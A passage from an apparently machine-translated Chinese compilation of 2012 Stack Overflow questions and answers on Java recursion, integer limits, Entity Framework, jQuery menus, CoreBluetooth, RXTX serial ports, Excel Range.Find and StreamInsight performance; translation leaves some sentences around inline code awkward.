列表角色；

```
 //setter getter 
```

}

公共类角色{

```
private String id;
private String name; 
```

//setter 获取器

}

**这是控制器请求**

@RequestMapping(value = "/role", method = RequestMethod.GET)

```
public @ResponseBody
Location role(HttpServletResponse response) {

    System.out.println("name");
    Location shop = new Location();
    List<Role> list = new ArrayList<Role>();
    Role role = new Role();
    role.setId("abc");
    role.setName("abc");
    list.add(role);
    Role role1 = new Role();
    role1.setId("abc1");
    role1.setName("abc1");
    list.add(role1);
    shop.setRole(list);
    return shop;

} 
```

**jsp页面**

**修改jqgrid的选择部分**

```
{ name: 'name', index: 'name', editable: true, edittype: "select",
 editoptions: {dataUrl:"location/role.do", 
buildSelect: function (role) 
{ 
var data = jQuery.parseJSON(role); 
var s = '<select>'; 
for (var i = 0; i < data.role.length; i++) {
 s += '<option value="' + data.role[i].id + '">' + data.role[i].name + '</option>'; 
} 
return s + "</select>"; 
} 
} 
} 
```

它会运行良好

# java - 解释这个递归算法来打印一个数字的所有有序数字

> ID：12866550
> 
> 赞同：2
> 
> 时间：2012-10-12T20:22:01.937
> 
> 标签：java, math, recursion

给定位数，我有此代码可以打印所有“有序”位数的数字

（如果数字是`xyz`，那么它是有序的，当且仅当 x<y<z），

该代码有效，但我无法理解 for 循环中使用的逻辑。这是递归，但如果有人能解释更多，那就太好了。

```
class OrderedNumbers{

    public static void main(String args[]){
        printOrdered(0,0,3); // 3 digit numbers
    }

    private static void printOrdered(int number, int prev, int n) {

        if(n==0){
            System.out.println(number);
            return;
        }

        for(int i=(prev+1); i<(11-n); i++){
            printOrdered(number*10 + i, i, n-1) ;
        }

    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:30:55.227

看看论据。

*   `number`是迄今为止组成的数字。在添加最后一个数字之前，我们将其乘以 10，以便在该数字上再添加一个数字。
*   `prev`是前一个数字的值。循环将在此`for`之后开始一个，从而确保数字中的数字是有序的。
*   `n`是尚未附加的位数。当它达到零时，已经达到最大递归深度并打印数字。我们还使用循环`n`中的上限计算。`for`最后一位不得大于 9，倒数第二位不得大于 8，以此类推。`n=1`您可以从条件读取的事实中看到这一点`i<10`，即`i<=9`。

递归调用将传递前一个数字加上一个数字，该数字的值以确保后面的数字更大，并且剩余数字的数量减少一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:42:57.500

函数的最后一个参数控制函数调用自身的次数。当`printOrdered`在循环中调用自身时，它获取当前数字并移动将其乘以十（将数字向左移动一位）。然后它添加`i`（把它放在那些地方）。当`n=0`函数知道所有必要的数字都已添加时，它会返回（打印）当前数字。

`i`从比前一个数字多一个（否则它不会是有序数字）到`11-n`，这就是说在有数字的`n`数字中，最高有效数字只能与 一样大`11-n`。考虑具有 3 位数字的最大有序数`789`。百位永远不能大于 7，你明白为什么吗？

总之

*   `number`是当前（可能不完整）的有序数
*   `prev`是添加到的最后一个数字`number`
*   `n`是需要添加的位数`number`
*   `i`循环遍历所有可以添加到`number`下一个位置的数字。它必须大于最后一个数字，但仍为剩余的数字留出空间，这些数字将在再次`printOrdered`调用时添加。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:48:08.350

首先，请注意，对于要“排序”的数字，最左边的数字必须小于`(11-n)`，其中`n`是位数。如果您使用 3 位数字，则订购“789”，但如果最左边的数字是 8，然后是 9，则将没有更高的数字来填充最右边的位置。（所有其他数字也是如此。）

在对 的第一次调用中`printOrdered`，`for`循环生成所有可以在最左边位置使用的有效数字。对于每个这样的数字，递归调用会生成所有可用于倒数第二位的有效数字，依此类推。`number`是一个累加器，用于累积要打印的数字，而`n`倒计时直到要打印的数字已完全累积。`prev`被误导；它将出现在这个数字的*左侧*。对于要“排序”的数字，您只能生成*高于*的数字`prev`，这就是循环变量初始化为 的原因`prev + 1`。

# ios - CoreBluetooth 连接建立时间变化很大

> ID：12866551
> 
> 赞同：1
> 
> 时间：2012-10-12T20:22:08.223
> 
> 标签：ios, core-bluetooth

将我的应用程序连接到蓝牙 4.0 设备所需的时间似乎有很大差异。相同的应用程序，相同的设备。有时它会立即连接——比如不到一秒钟。有时大约需要 10-12 秒。并且一旦它根本没有连接 - 我需要重新启动扫描等。我想知道是否有其他人看到过这个问题。这可能是什么原因造成的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-30T11:33:04.870

我也发现了同样的问题。我每 2 秒有一个 BLE 设备广告。

```
[self.CM scanForPeripheralsWithServices:nil options:0] 
```

0.2s 到 ~30s 后返回。（CM 是我的 CentralManger）

我的下一步是在 CSV 文件中收集时间，并绘制各种连接时间的频率分布以及连接时间与时间的关系，看看我是否能辨别出一种模式。

有一个有用的 TI[演示器应用程序](http://processors.wiki.ti.com/index.php/Category%3aIPhone4SBLEDemo#App_Operation)。但令人讨厌的是，他们已经使其通用并且没有实现 iPad 故事板（它在那里并且空白），并且当我尝试在调试模式下运行时，将其设置为仅限 iPhone 版本会导致错误。而且我手头没有另一台支持 BLE 的 Apple 设备。

打电话

```
[self.CM stopScan]; 
```

在 scanWithPeripherals 之前似乎减少了真正长时间等待的发生。

[我尝试了这个Stackoverflow 答案](https://stackoverflow.com/questions/11557500/corebluetooth-central-manager-callback-diddiscoverperipheral-twice)中看到的 CBCentralManagerScanOptionAllowDuplicatesKey 选项，但如果有任何似乎延长发现时间的东西。

我想我会得到一些蓝牙数据包嗅探器工具来帮助查看空气中的实际情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T18:23:20.487

这可能有很多原因。这里有一些我的头顶。

1.  该设备不经常做广告。O/S 基本上扫描正在发送广告信号的设备。这是设备为节省电池电量而尽可能少做的事情。有些设备有一个按钮，可以让它们在您建立连接时更频繁地做广告。其他人可能有允许您更改广告费率的设置。（您使用的是什么设备？）

2.  该设备可能连接到其他设备。

3.  电池电量可能不足。

4.  可能有来自其他来源的无线电干扰。WiFi经常是一个问题。蓝牙 4.0 和 WiFi 设备都使用跳频。尝试关闭或重新启动 WiFi 网络。尝试关闭手机上的 WiFi，看看是否有帮助。

5.  当然，虽然我们不愿意承认这一点，但总有一种潜在的可能性是我们在应用程序中编码错误！我们得到一个连接这一事实并不能保证该应用程序是完美的。

# ios - 使用脚本在 iPhone 上自动执行用户操作

> ID：12866552
> 
> 赞同：0
> 
> 时间：2012-10-12T20:22:08.787
> 
> 标签：ios, automation, user-input

我开发了一个 iPhone 应用程序，它需要用户操作才能从弹出列表中选择一个选项。此列表由操作系统而不是应用程序生成。我想知道是否有办法编写和运行脚本以在出现此列表时自动执行用户操作。在 iOS 应用程序中是否有工具（脚本/第三方服务等）可以执行此类操作？另外，我正在寻找不限于测试环境的解决方案。请指教..

提前致谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:30:06.533

据我所知，使用 Apple 的框架无法做到这一点，主要是因为如果可以的话，您可以在未经用户许可的情况下使用 iPhone做*任何事情。*

如果您的应用程序不应该进入 App Store，那么也许有办法，但我不知道。

# java - 为什么 java 中的最大整数是 2^31 - 1 而不是 2^31

> ID：12866554
> 
> 赞同：13
> 
> 时间：2012-10-12T20:22:19.573
> 
> 标签：java, memory, integer

抱歉，如果这是一个非常基本的问题，但为什么正面有一个减号？

它与存储的零有关吗？我认为为二进制计算可能的最高十进制数只是将两个的幂相加，例如对于 3 位无符号数

```
1*2^0 + 1*2^1 + 1*2^2 = 7 
```

相同的规则不应该适用于 java 整数吗？谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-10-12T20:26:04.793

因为 Java 可以支持最大带符号整数，`0x7fffffff`即 2^31-1。

```
2^31 = 0x80000000 is negative so Positive is 2^31-1 
```

二进制级别比较将是：

```
10000000000000000000000000000000  --> 2147483648 --> 2^31
01111111111111111111111111111111  --> 2147483647 --> 2^31 -1
^ Sign bit 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-12T20:24:12.523

同样的规则也适用……`7`是`2^3 - 1`。是的，这是因为 0。:)

相比之下，否定去`-(2^31)`

所以有`2^31`负数、一`0`和`2^31-1`严格的正数，它们增加了......

```
2^31 + 1 + 2^31 - 1 = 2 * 2^31 = 2^32 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-10-12T20:25:53.010

这是因为**二进制补码**的便利性（避免存储两个零），Java 使用这种表示形式存储数字。看看[这里](http://en.wikipedia.org/wiki/Two%27s_complement)。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-10-12T20:25:14.597

有从到的`2^31`非负数。所以，是的，也存储为整数。而且，还有从到的负数。`0``2^31-1``zero``2^31``-2^31``-1`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-10-12T20:24:24.847

它必须拆分 2^32。
1/2 为负数。
0 计为阳性。
在数学中，0 既不是负数也不是正数。
它在 .NET 和 MSSQL 中是一致的。

如果您注意到不包含负数的集合称为无符号集合。
它包含 0，不适合称其为正数。
由于二进制世界从 0 开始，因此它被视为正数。
Jack (+1) 的回答说明了原因。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-12T20:25:33.883

如果您有 n 位，则您有 2^(n-1) 个负数（因为最高位是 1）和 2^(n-1) 个非负数。由于零是非负数，因此您最多有 2^(n-1)-1 个正数，这也是最大值。

注意：最负数没有正数，所以

```
-Integer.MIN_VALUE == Integer.MIN_VALUE 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-12T20:29:41.320

Java 整数是有符号的数量，因此为符号保留一位，为值保留 31 位。

# entity-framework - EF 延迟加载：EntityType 未声明名称为导航属性

> ID：12866556
> 
> 赞同：0
> 
> 时间：2012-10-12T20:22:29.660
> 
> 标签：entity-framework, lazy-loading

我有一个类似的类结构：

```
public class Customer{
         public AgreementDetails Agreement { get; set; }
}

[ComplexType]
public class AgreementDetails{
    public int SalesPersonId { get; set; }
    [ForeignKey("SalesPersonId")]
    [NotMapped]
    public virtual SalesPerson Sales { get; set; }
}
public class SalesPerson
{
...
} 
```

当我显示客户列表时，我正在调用 Sales 属性来显示销售人员的详细信息，但属性为 null，通常对于导航属性，可以避免使用 .Include 方法，但在我的情况下它不起作用，所以查询是

```
List<Customer> res = db.Customers.Include(c=>c.Agreement.Sales).ToList(); 
```

例外是：

> 指定的包含路径无效。EntityType 'CodeFirstNamespace.Customer' 未声明名为 'Agreement' 的导航属性。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:38:40.377

我找到了答案：**复杂类型不应该包含导航属性（以及外键）。**

# jquery - 导航菜单无法正常工作

> ID：12866559
> 
> 赞同：-3
> 
> 时间：2012-10-12T20:22:55.160
> 
> 标签：jquery, html, css

我想创建一个导航菜单..

我为此使用jquery...

```
 $('.about').on('mouseenter', function(){
        $(this).css({'background':'#144f19'});
        $('.submenu_about').css({'display':'block', 'position':'absolute'});
        $('.items_list').on('mouseout', function(){
            $('.submenu_about').css({'display':'none', 'opacity':'0px'});
            $('.about').css({'background':'none'});
        })
   }); 
```

但不能正常工作。有谁能够帮助我？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:38:18.723

可能不是答案（您没有提供足够的信息来理解问题）但您现在有

```
$('.about').on('mouseenter', function(){
    //...
    $('.items_list').on('mouseout', function(){
        //...
    });
}); 
```

但应该是

```
​$(function(){
    $('.about').on('mouseenter', function(){
        //...
    });

    $('.items_list').on('mouseout', function(){
        //...
    });
}); 
```

**更新**：[**可能是你想要这个**](http://jsfiddle.net/3ZSsv/6/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:38:37.643

这是你可以做的，根本不包括 jQuery。

[http://jsfiddle.net/qsENf/1/](http://jsfiddle.net/qsENf/1/)

我只包含了“关于”部分的 css，但可以轻松更改代码以处理任何项目。我不知道这是否是您想要的，但应该很接近。如果您想使用 jQuery，那么您可以定义 css 类并使用 jQuery 添加它们，而不是更改所有元素的 css。

这是CSS：

```
.submenu_about {
    display: none;
}

.about {
    background:transparent;
}
.about:hover {
    background:#144f19;
}

.about:hover .submenu_about {
   display: block;
} 
```

和html：

```
<div class="navigation_bar">
  <ul class="menu_list">
    <li class="a_menu_item about">
      About Us
      <div class="submenu_about">
        <ul class="items_list" style="list-style:none">
          <li class="a_sub_menu_item"><a href="#">News and Events</a></li>
          <li class="a_sub_menu_item"><a href="">Financial Assistance</a></li>
          <li class="a_sub_menu_item"><a href="">Who We See</a></li>
          <li class="a_sub_menu_item"><a href="">Insurance Information</a></li>
        </ul>
      </div>

    </li>
    <li class="a_menu_item theater">Theater</li>
    <li class="a_menu_item leader">Leadership Team</li>
    <li class="a_menu_item career">Careers</li>
    <li class="a_menu_item contact">Contact Us</li>
  </ul>
</div> 
```

jQuery isn't necessary for this. If your subnav is not inside of the main nav then jQuery would be useful for toggling its visibility.

# asp.net-mvc - .Include 包含在实体框架中有多贵？

> ID：12866560
> 
> 赞同：2
> 
> 时间：2012-10-12T20:22:56.350
> 
> 标签：asp.net-mvc, entity-framework, azure, azure-sql-database

我在 ASP.NET MVC 操作方法中有以下简单查询。

```
IEnumerable<Company> query = unitOfWork.CompanyRepository.dbSet
    .Include("Adresses.PhoneNumbers")
    .Include("Adresses.FaxNumber")
    .Include("Emails").Where(q => q.CustomerCompany == true); 
```

此操作方法通过 ajax get 请求调用，有时需要长达 25 秒！数据库中只有 40 家公司。每个公司都有一个地址，最多有几个电话号码和传真号码。（有趣的是，有时需要 200-500 毫秒，但非常罕见）

如果我将此查询更改为以下

```
IEnumerable<Company> query = unitOfWork.CompanyRepository.dbSet
    .Where(q => q.CustomerCompany == true); 
```

它只需要大约 200 毫秒。

所以我想知道为什么`.Include`这么贵。我的应用程序正在生产中，我正在将 SQL Azure 与 Azure 网站一起使用。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:26:14.447

生成的 SQL 比较复杂，但通常性能是由于 LINQ 查询编译开销所致。您需要配置文件才能确定。一种可能的解决方法是使用预编译查询，第二次和后续时间会更快。更好的解决方法可能是仅使用您需要的数据的投影，而不是在查询中包括 4 个实体，这相当于`SELECT *`所有 4 个表上的 a。如果您需要所有这些完整实体，另一个可能的解决方法是显式加载详细信息，这意味着更多（但更快！）查询。

# algorithm - 利用记忆化分析 NxN 矩阵中最重路径的时间复杂度

> ID：12866568
> 
> 赞同：1
> 
> 时间：2012-10-12T20:23:28.990
> 
> 标签：algorithm, time-complexity, dynamic-programming

下面的算法（伪代码）的时间复杂度是多少？我很难分析它。它是在另一个线程中指定的问题的实现：[Algorithm to find max cost path of length N in matrix, from [0,0] to last row](https://stackoverflow.com/q/12744424/1009831)。但是因为我是新来的，所以我没有足够的积分在线程中发表评论（我认为）？这是我的第一篇文章，如果我做错了什么，请原谅。

该算法使用带有`cache[][][][]`. 在初始化期间`cache[][][][]`填充-1。

使用 调用该方法`maxPath(0,0,m,DOWN)`。其中 m 是要采取的步数，n<=m<=n^2，方向定义为 DOWN=0, LEFT=1, RIGHT=2。

```
function maxPath(i, j, fuel, direction)
    if i = n OR j = n OR j < 0 OR fuel = 0 then
         return 0;
    end if
    if cache[i][j][f-1][d] != -1 then
         return cache[i][j][f - 1][d];
    end if
    ret := 0
    acc+ = matrix[i][j]
    ret:=max(ret,maxPath(i+1, j, fuel-1, DOWN))
    if f > n - i then . If there is enough steps to move horizontally
        if d = RIGHT or d = DOWN then
            ret:=max(ret,maxPath(i, j+1, fuel-1, RIGHT))
        end if
        if d = LEFT or d = DOWN then
            ret:=max(ret,maxPath(i, j-1, fuel-1, LEFT))
        end if
    end if
    return cache[i,j,fuel-1,direction] = ret + matrix[i][j]
end function 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T10:47:15.123

好的，我已经解决了它，并在想我应该分享我的结果。

如果我们让 G=(V,E) 是一个图，其中 V={maxPath(i, j, p, d) : 对于所有可能的 i, j, p 和 d } 并且 E= {uv : u = f(i , j, p, d) 和 v = f(i', j', p', d') }。我们知道 G 是一个状态图，显然是 DAG（有向无环图）。然后，我们可以使用 memoization 计算 maxPath。

我们有

```
 n possible values for i
    n possible values for j
    m possible values for fuel (which in worst case is n^2)
    3 possible values for direction 
```

然后我们有 n * n * m * 3 个不同的 maxPath 函数被调用，在最坏的情况下是 n^4*3。所以，我们有 O(n^4) 个不同的函数。每次调用函数都在 O(1) 时间内运行。由于该图具有次优结构，因此每个子问题都是原始问题的问题。因此，通过记忆化，我们不必两次计算相同的“函数”，因此我们得到 O(n^4)。

# java - Mac 上的 RxTx - 串行端口已在使用中

> ID：12866572
> 
> 赞同：10
> 
> 时间：2012-10-12T20:24:04.290
> 
> 标签：java, arduino, rxtx

我在 Mac 上安装了[RXTX 。](http://jlog.org/rxtx-mac.html)如果我们尝试打开串行端口，Java JAR 程序和 Arduino 软件都将 Arduino 视为 USB 调制解调器。两者都声称端口“已在使用”。两者都声称“未知用户”。我`rxtxcomm.jar`在 Java Extensions 中有。

我如何让其中任何一个工作？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-10-12T23:02:24.760

OS X 在串行端口上有某种排除机制。MacBook 没有任何串行端口，但 USB 端口可以模拟它们。连接 Arduino 后，它在端口列表中显示为“/dev/tty.usbmodem ...”，其中`...`有一些尾随数字。

当说端口忙时，这是一个标准的[I/O](http://en.wikipedia.org/wiki/Input/output)异常，这意味着我们无法访问。当前所有者未定义，因为没有当前所有者。我们只是没有获得所有权所需的目录访问权限。

使用 Apple 终端，执行以下操作：

```
 sudo mkdir /var/lock
 sudo chmod a+rw /var/lock 
```

这将创建所需的目录并使其可访问。串口将不再忙，当然除非有别的东西真的在使用它！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-18T06:47:41.617

processing.app.SerialException：串行端口“/dev/tty.usbmodem ...”已在使用中。尝试退出任何可能正在使用它的程序。

当我的外部 USB 硬盘也连接时，我会发生这种情况。当我断开它时，Arduino 的上传过程会正常工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-14T04:59:10.047

我在 RXTX 站点的[故障排除 Mac OS X](http://rxtx.qbang.org/wiki/index.php/Trouble_shooting#Mac_OS_X_users)下找到了一些信息。他们有一个可以运行的 shell 脚本，称为`fixperm.sh`更改`/var/lock/`. `/var/lock`有关[FHS 网站](http://www.pathname.com/fhs/2.2/fhs-5.9.html)的更多信息。

# entity-framework - 使用 Database First 模型 (EF 5) 向模型添加验证

> ID：12866576
> 
> 赞同：4
> 
> 时间：2012-10-12T20:24:21.030
> 
> 标签：entity-framework, validation, annotations, database-first

我知道如何将验证错误添加到模型状态。我知道如何将验证注释添加到我的模型类中。问题是，首先使用数据库，我不想接触生成的代码，因为当我重新生成时，我将失去我的自定义。我总是尝试在部分中进行自定义，但是您不能在部分中为现有属性添加注释。

这里的最佳做法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-17T02:07:34.607

你需要利用`MetadataTypeAttribute`

做这样的事情：

创建一个新的类文件，将其保存在与分部类相同的命名空间中。即使您从数据库更新模型，这个新类也会保留您的验证规则。修改新类文件的内容，如下所示，更改为您的规范等。

```
[MetadataTypeAttribute(typeof(YourCustomClassForValidation))]
public partial class Person
{
   // No need to put anything here because you already defined these properties
}

public class YourCustomClassForValidation
{
   [DisplayName("Full Name")]
    public string name { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T18:49:19.177

您需要将 EDMX 文件和实体分开：

*   EDMX 文件可以放在 Scaffolding 项目中。
*   实体可以放在 Data.Contracts 项目中。

更新 EDMX 模型后，您需要手动将新生成的实体的更改应用于 Data.Contracts 项目的实体。

# javascript - 在图像上使用鼠标悬停更改文本？

> ID：12866577
> 
> 赞同：0
> 
> 时间：2012-10-12T20:24:21.080
> 
> 标签：javascript, onmouseover

我希望文本根据用户悬停在哪个图像上而改变。我以为我的想法是正确的，但代码不起作用。

[http://jsfiddle.net/6V2TL/](http://jsfiddle.net/6V2TL/)

HTML

```
<p id="test">
some text 1
</p>
<div id="image1" onmouseover="change1()">
    <img src="http://www.helpinghomelesscats.com/images/cat1.jpg">
</div>
<div id="image2" onmouseover="change2()">
    <img src="http://cvcl.mit.edu/hybrid/cat2.jpg">
</div> 
```

JS

```
function change1() {
     document.getElementById("test").innerHTML = "this is a cute cat";   
}
function change2() {
     document.getElementById("test").innerHTML = "this is a cuter cat";   
}    ​ 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:27:32.843

您的代码在内部和 onLoad 处理程序中，无法从页面运行。左侧的第一个下拉菜单对此进行了更改，请从列表中选择“no wrap (head)”。

演示：http: [//jsfiddle.net/SO_AMK/35s4C/](http://jsfiddle.net/SO_AMK/35s4C/)

```
function change1() {
  document.getElementById("test").innerHTML = "this is a cute cat";
}

function change2() {
  document.getElementById("test").innerHTML = "this is an angry cat";
}
```

```
<p id="test">
  some text 1
</p>

<div id="image1" onmouseover="change1()">

  <img src="http://lorempixel.com/output/cats-q-c-640-480-1.jpg">

</div>

<div id="image2" onmouseover="change2()">
  <img src="http://lorempixel.com/output/cats-q-c-640-480-2.jpg">
</div>
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:28:15.630

如果您查看控制台，您会看到您的控制台在悬停时抛出关于找不到功能的错误。

默认情况下，JFiddle 在页面加载特殊处理程序后加载 Javascript 框中的代码，您希望更改它以将代码置于非包装形式中，因此当正文悬停发生时，函数实际上是全局存在的，因此它们可以访问：http: [//jsfiddle.net/6V2TL/3/](http://jsfiddle.net/6V2TL/3/)

它位于工具栏左侧的选项中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:36:29.357

它看起来的 JSfiddle 站点有问题。我将 js 移到 HTML 窗口，它工作。但是您的代码有效。

[http://jsfiddle.net/6V2TL/9/](http://jsfiddle.net/6V2TL/9/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:29:18.050

您的 javascript 方法`onchange1`，`onchange2`没有调用 onmouseover 事件。你可以试试这个链接

[http://jsfiddle.net/6V2TL/5/](http://jsfiddle.net/6V2TL/5/)。

# php - baseUrl 视图助手在 ZendFramework 2 上不起作用

> ID：12866578
> 
> 赞同：2
> 
> 时间：2012-10-12T20:24:22.123
> 
> 标签：php, zend-framework2

我正在使用新的 Zend Framework 2 进行测试，在尝试使用 baseUrl 视图帮助程序时发现了一个问题，`$this->baseUrl()`在我的 phtml 视图文件中调用时出现以下错误；

调试错误：

> C:\Zend\ZendServer\share\ZendFramework2\library\Zend\ServiceManager\ServiceManager.php 第 424 行 - 未捕获异常 'Zend\ServiceManager\Exception\ServiceNotFoundException' 并带有消息 'Zend\ServiceManager\ServiceManager::get 无法获取或在 C:\Zend\ZendServer\share\ZendFramework2\library\Zend\ServiceManager\ServiceManager.php:424 中为 baseUrl' 创建一个实例

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-12T20:54:23.450

这看起来像 ZF1 功能，ZF2 有帮助器 Zend\View\Helper\BasePath

在视图中 $this->basePath();

# excel - 范围查找方法和列宽

> ID：12866583
> 
> 赞同：3
> 
> 时间：2012-10-12T20:24:59.470
> 
> 标签：excel, vsto

我遇到了一个我无法找到文档的问题。

我一直在用数据填充电子表格。然后我在我的工作表中搜索一个特定的值，我发现其中一些找不到。

我“解决”了我的问题，但我对 Range.Find 的行为感到非常惊讶。

发生的事情是，当我填充工作表时，一些值显示为 ######，因为列大小不够宽。我注意到那些是找不到的值。在我对所有列运行自动调整后，我能够找到每个值。

除了调整列的大小之外，我还能做些什么吗？

编辑更新：

我第一次有这个：

```
find.Find(day.ToShortDateString(), Type.Missing, Excel.XlFindLookIn.xlValues, 
Excel.XlLookAt.xlWhole, Excel.XlSearchOrder.xlByRows, 
Excel.XlSearchDirection.xlNext, false, Type.Missing, Type.Missing); 
```

我将其切换为：

```
find.Find(day.ToShortDateString(), Type.Missing, Excel.XlFindLookIn.xlFormulas, 
Excel.XlLookAt.xlWhole, Excel.XlSearchOrder.xlByRows, 
Excel.XlSearchDirection.xlNext, false, Type.Missing, Type.Missing); 
```

现在列宽不是问题。

在哪些情况下会使用不同的 .XlFindLookIn 参数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-15T00:08:02.853

```
Excel.XlFindLookIn.xlValues 
```

根据单元格的 .Text 属性的值进行搜索（我看过一些 MS 论坛帖子，他们说它是基于 .Value2 的，但您的案例清楚地证明了这一点）

```
Excel.XlFindLookIn.xlFormulas 
```

根据单元格的 .Formula 属性值进行搜索。如果单元格具有固定值或用于该单元格的实际公式，则此属性包含与 .Value2 属性相同的值。

这一切都意味着您自己的解决方案仅在您的工作表仅包含固定值并且不会找到值来自公式的单元格时才有效。

请注意，此搜索行为不是 VSTO 特定的。它与它在 Excel 本身的查找对话框中的工作方式相同，如果您从 VBA 调用 if 也是如此。

最简单的测试用例：

*   在单元格 A1 中输入 1234567
*   在单元格 A2 中输入 =A1
*   调整（缩小）列宽直到你得到 1E+06
*   转到搜索对话框 (ctrl+f) 并打开展开选项
*   输入 1234567 作为搜索值
*   在“公式”中查找“全部查找”将返回“A1”
*   在“值”中查找“全部查找”将不返回任何内容
*   现在调整列的大小，使整个值可见并再次启动查找对话框
*   在“公式”中查找“全部查找”仍将返回“A1”
*   在“值”中查找的“查找全部”现在将返回“A1”和“A2”

# c# - StreamInsight 性能问题

> ID：12866584
> 
> 赞同：0
> 
> 时间：2012-10-12T20:25:04.947
> 
> 标签：c#, .net, streaminsight, complex-event-processing

我正在使用 StreamInsight 2.1 并遇到了意外的性能问题。

我有一个财务数据输入适配器，每秒输入 5,000 到 10,000 个事件。然后，我有大量针对该输入的查询。每个查询都连接到完全相同的直通查询，因此我有 1000 个查询使用完全相同的输入数据。

为了测试系统是否能够处理这个问题，我创建了 1000 个查询，这些查询除了传递（*from d in fullStream select d*）事件到仅释放事件的输出适配器之外什么都不做。

当我以这种方式运行 1,000 个查询时，系统无法跟上数据流。它越来越落后。如果我将其减少到 100 个查询，则系统可以完美运行。

我是否只是在使用 StreamInsight 时遇到了性能壁垒？它无法处理我正在构建的解决方案类型吗？还是我在这里做一些愚蠢的事情......任何帮助都会很棒，不知道还有什么可以让它更快。我需要它能够执行超过 1000 个查询，并且我需要运行比这更复杂的查询。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T20:37:03.563

这听起来确实像一个横向扩展问题。您已经确定可以在服务器上运行 100 个查询而不会出现任何问题。然后，在您对其他答案的评论中，您正在谈论数以万计的客户添加数以千计的查询。有了这么多客户，我怀疑您将有能力添加新服务器来满足这些客户群的需求。

所以通过分散负载来增加吞吐量，也许通过——我不知道——某种形式的分布式计算？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-13T06:57:09.433

I think you maybe having performance issues because of your current approach.

First off, let's cover the differences between the editions of StreamInsight. Standard edition has only 1 scheduler thread while Premium has one per core. The Evaluation edition is equivalent to Premium.

I think the way to fix this is to reduce the number of queries you have. If you are creating 1000 queries (each with their own instance of an output adapter) I can see where you are going to have issues. On a quad-core machine, you are going to have 4 scheduler threads trying to run 1000 queries.

Are your queries that are arranged "horizontally" doing the same thing? If so, see if you can consolidate them. For instance, if I needed to do a query like the "Price>5 Vol<2k" for 5 different stocks, I would write it in such a way that I can handle all 5 stocks in a standing query that sends all the results to 1 output adapter. If a client is "subscribing" to results from a query, that's something that can/should be handled by your output adapter. You could also turn results on and off for certain stocks by streaming in reference data.

Take a look at the sample below. "sourceStream" is going to be my raw stock data coming from the data source. "referenceStream" is going to be some configuration streamed in from a reference data source (i.e. SQL). The success or failure of the join will throttle the events that get passed on for further processing.

```
var myPrice5Vol2kSourceStream = from s in sourceStream
join r in referenceStream
on s.StockSymbol equals r.StockSymbol
select s; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T17:58:25.660

每个查询都需要一个线程来执行。您有 1000 个查询。所以你需要多少个线程？正确的。实际上，StreamInsight 会使用线程池来限制创建的线程数。所以......您将有有限数量的线程来执行您的查询。您最终会花费更多时间进行上下文切换，而不是实际执行查询。

我不明白为什么你甚至*需要*1000 个查询。我们已经构建了应用程序，可以从多个来源获取 100 多个传感器并一起分析它们……并获得超过 10 万个事件/秒。归根结底，是您的应用程序设计不佳，而不是 StreamInsight 的性能不佳，这才是导致问题的原因。

你真的需要花一些时间重新考虑你是如何处理这件事的。无论您如何切片，您当前的方法都会给您带来问题。并且......考虑一下......每个输入适配器是否创建自己的线程来监听入站和入队事件？您认为这增加了多少线程？

# java - 垂直条的任何其他用途类型？

> ID：12866594
> 
> 赞同：0
> 
> 时间：2012-10-12T20:25:54.337
> 
> 标签：java, oop, interface, java-7, unions

> **可能重复：**
> [在 Java 7 多捕获块中，捕获的异常的类型是什么？](https://stackoverflow.com/questions/8393004/in-a-java-7-multicatch-block-what-is-the-type-of-the-caught-exception)

在 Java SE 7 中，可以捕获多种类型的异常：

```
catch (IOException|SQLException ex) {
   logger.log(ex);
   throw ex;
} 
```

这种语法还有其他用法吗？

我可以用这种语法创建联合吗，比如

```
public void main() {
    Integer|Boolean a;
    a=true;
    a=Integer.Zero;
} 
```

或者我可以使用它来匿名派生多个接口，比如

```
public void main() {

    Object o = new List<Integer>|Comparable<List<Integer>>() {
        // here implementing both interfaces...
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T01:11:59.313

The type is the least upper bound of IOException and SQLException, Exception, but with a special rule if you rethrow the exception making sure that the checked exceptions list is IOException and SQLException, not Exception.

See section 14.20 of the Java Language Specification for more precise details - [http://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.20](http://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.20)

There isn't really anything similar elsewhere in Java except in choosing the type of the ternary operator.

